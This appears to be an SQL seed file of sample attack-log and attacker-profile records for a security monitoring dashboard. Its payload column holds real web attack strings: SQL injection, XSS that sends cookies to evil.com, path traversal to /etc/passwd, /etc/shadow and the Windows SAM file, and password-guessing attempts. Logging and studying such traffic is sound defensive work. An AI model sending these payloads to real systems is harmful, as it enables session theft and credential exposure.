INSERT INTO attack_logs 
(timestamp, source_ip, source_port, method, path, payload, attack_type, severity, user_agent, tool_detected, os_fingerprint, session_id, response_code)
VALUES

('2025-05-24 08:01:12', '185.220.101.45', 54321, 'POST', '/api/login', 
'username=admin''--&password=anything', 'sqli', 'CRITICAL', 
'sqlmap/1.7.8 (https://sqlmap.org)', 'sqlmap', 'Linux x86_64', 'sess_a1b2c3', 200),

('2025-05-24 08:03:44', '185.220.101.45', 54322, 'POST', '/api/login', 
'username='' OR 1=1--&password=test', 'sqli', 'CRITICAL', 
'sqlmap/1.7.8 (https://sqlmap.org)', 'sqlmap', 'Linux x86_64', 'sess_a1b2c3', 200),

('2025-05-24 08:05:10', '185.220.101.45', 54323, 'POST', '/api/login', 
'username=admin'' UNION SELECT null,null--&password=x', 'sqli', 'HIGH', 
'sqlmap/1.7.8 (https://sqlmap.org)', 'sqlmap', 'Linux x86_64', 'sess_a1b2c3', 200),

('2025-05-24 08:15:33', '91.108.4.77', 61200, 'GET', '/api/search', 
'q=<script>alert(document.cookie)</script>', 'xss', 'HIGH', 
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'manual', 'Windows 10', 'sess_d4e5f6', 200),

('2025-05-24 08:17:02', '91.108.4.77', 61201, 'POST', '/api/comments', 
'content=<img src=x onerror=alert(1)>', 'xss', 'HIGH', 
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'manual', 'Windows 10', 'sess_d4e5f6', 200),

('2025-05-24 08:18:45', '91.108.4.77', 61202, 'POST', '/api/comments', 
'content=<svg onload=fetch("http://evil.com?c="+document.cookie)>', 'xss', 'CRITICAL', 
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'manual', 'Windows 10', 'sess_d4e5f6', 200),

('2025-05-24 08:30:01', '45.155.205.10', 49800, 'POST', '/api/login', 
'username=admin&password=admin', 'bruteforce', 'MEDIUM', 
'python-requests/2.31.0', 'custom_script', 'Linux x86_64', 'sess_g7h8i9', 401),

('2025-05-24 08:30:03', '45.155.205.10', 49801, 'POST', '/api/login', 
'username=admin&password=123456', 'bruteforce', 'MEDIUM', 
'python-requests/2.31.0', 'custom_script', 'Linux x86_64', 'sess_g7h8i9', 401),

('2025-05-24 08:30:05', '45.155.205.10', 49802, 'POST', '/api/login', 
'username=admin&password=password', 'bruteforce', 'MEDIUM', 
'python-requests/2.31.0', 'custom_script', 'Linux x86_64', 'sess_g7h8i9', 401),

('2025-05-24 08:30:07', '45.155.205.10', 49803, 'POST', '/api/login', 
'username=admin&password=qwerty', 'bruteforce', 'MEDIUM', 
'python-requests/2.31.0', 'custom_script', 'Linux x86_64', 'sess_g7h8i9', 401),

('2025-05-24 08:30:09', '45.155.205.10', 49804, 'POST', '/api/login', 
'username=admin&password=letmein', 'bruteforce', 'MEDIUM', 
'python-requests/2.31.0', 'custom_script', 'Linux x86_64', 'sess_g7h8i9', 401),

('2025-05-24 08:45:22', '194.165.16.80', 55100, 'GET', '/api/download', 
'file=../../../../etc/passwd', 'traversal', 'CRITICAL', 
'Nikto/2.1.6', 'nikto', 'Linux x86_64', 'sess_j1k2l3', 200),

('2025-05-24 08:46:10', '194.165.16.80', 55101, 'GET', '/api/download', 
'file=../../../etc/shadow', 'traversal', 'CRITICAL', 
'Nikto/2.1.6', 'nikto', 'Linux x86_64', 'sess_j1k2l3', 200),

('2025-05-24 08:47:05', '194.165.16.80', 55102, 'GET', '/api/download', 
'file=../../windows/system32/config/sam', 'traversal', 'HIGH', 
'Nikto/2.1.6', 'nikto', 'Linux x86_64', 'sess_j1k2l3', 200),

('2025-05-24 09:00:15', '5.188.210.33', 62000, 'GET', '/api/search', 
'q=<script>document.location="http://evil.com"</script>', 'xss', 'HIGH', 
'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'manual', 'Linux x86_64', 'sess_m4n5o6', 200),

('2025-05-24 09:10:44', '77.83.198.22', 50200, 'POST', '/api/login', 
'username='' AND SLEEP(5)--&password=x', 'sqli', 'HIGH', 
'curl/7.88.1', 'curl', 'Linux x86_64', 'sess_p7q8r9', 200),

('2025-05-24 09:22:30', '185.220.101.45', 54400, 'GET', '/api/download', 
'file=....//....//etc/passwd', 'traversal', 'HIGH', 
'sqlmap/1.7.8 (https://sqlmap.org)', 'sqlmap', 'Linux x86_64', 'sess_a1b2c3', 200),

('2025-05-24 09:35:18', '45.155.205.10', 49900, 'POST', '/api/login', 
'username=root&password=toor', 'bruteforce', 'MEDIUM', 
'python-requests/2.31.0', 'custom_script', 'Linux x86_64', 'sess_g7h8i9', 401),

('2025-05-24 09:50:05', '91.108.4.77', 61300, 'GET', '/api/search', 
'q=<body onload=alert("xss")>', 'xss', 'MEDIUM', 
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'manual', 'Windows 10', 'sess_d4e5f6', 200),

('2025-05-24 10:05:55', '194.165.16.80', 55200, 'GET', '/api/download', 
'file=../../../proc/self/environ', 'traversal', 'CRITICAL', 
'Nikto/2.1.6', 'nikto', 'Linux x86_64', 'sess_j1k2l3', 200),

('2025-05-24 10:15:10', '5.188.210.33', 62100, 'POST', '/api/login',
'username=admin''/*&password=*/--', 'sqli', 'HIGH',
'curl/7.88.1', 'curl', 'Linux x86_64', 'sess_s1t2u3', 200),

('2025-05-24 10:25:33', '77.83.198.22', 50300, 'POST', '/api/comments',
'content=<script>new Image().src="http://evil.com/steal?"+document.cookie</script>', 'xss', 'CRITICAL',
'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0)', 'manual', 'Windows 7', 'sess_v4w5x6', 200),

('2025-05-24 10:40:01', '185.220.101.45', 54500, 'POST', '/api/login',
'username='' HAVING 1=1--&password=x', 'sqli', 'HIGH',
'sqlmap/1.7.8 (https://sqlmap.org)', 'sqlmap', 'Linux x86_64', 'sess_a1b2c3', 200),

('2025-05-24 10:55:22', '45.155.205.10', 50000, 'POST', '/api/login',
'username=administrator&password=P@ssw0rd', 'bruteforce', 'LOW',
'python-requests/2.31.0', 'custom_script', 'Linux x86_64', 'sess_g7h8i9', 401),

('2025-05-24 11:10:44', '91.108.4.77', 61400, 'GET', '/api/download',
'file=..%2F..%2F..%2Fetc%2Fpasswd', 'traversal', 'HIGH',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'manual', 'Windows 10', 'sess_d4e5f6', 200);

INSERT INTO attacker_profiles
(ip, first_seen, last_seen, total_requests, threat_score, country, city, isp, os, tool, is_known_malicious, sqli_count, xss_count, bruteforce_count, traversal_count)
VALUES

('185.220.101.45', '2025-05-24 08:01:12', '2025-05-24 10:40:01', 
18, 95, 'Germany', 'Frankfurt', 'Tor Exit Node - Quintex Alliance Consulting', 
'Linux x86_64', 'sqlmap', TRUE, 12, 0, 0, 2),

('91.108.4.77', '2025-05-24 08:15:33', '2025-05-24 11:10:44', 
12, 78, 'Netherlands', 'Amsterdam', 'Datacamp Limited', 
'Windows 10', 'manual', FALSE, 0, 7, 0, 2),

('45.155.205.10', '2025-05-24 08:30:01', '2025-05-24 10:55:22', 
20, 60, 'Russia', 'Moscow', 'Selectel Ltd', 
'Linux x86_64', 'custom_script', TRUE, 0, 0, 18, 0),

('194.165.16.80', '2025-05-24 08:45:22', '2025-05-24 10:20:05', 
9, 88, 'Iran', 'Tehran', 'Respina Networks', 
'Linux x86_64', 'nikto', TRUE, 0, 0, 0, 9),

('5.188.210.33', '2025-05-24 09:00:15', '2025-05-24 10:15:10', 
6, 55, 'China', 'Beijing', 'Shenzhen Tencent Computer Systems', 
'Linux x86_64', 'curl', FALSE, 2, 1, 0, 0),

('77.83.198.22', '2025-05-24 09:10:44', '2025-05-24 10:25:33', 
5, 72, 'Ukraine', 'Kyiv', 'ITL LLC', 
'Windows 7', 'manual', FALSE, 1, 1, 0, 0);